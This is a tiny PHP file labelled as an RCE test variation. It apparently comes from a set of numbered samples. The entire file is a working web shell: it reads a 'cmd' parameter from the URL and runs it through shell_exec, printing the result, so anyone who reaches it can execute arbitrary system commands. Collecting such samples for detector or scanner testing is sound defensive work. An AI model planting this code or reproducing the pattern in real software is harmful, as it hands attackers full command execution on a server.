<?php
// RCE test variation #449
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>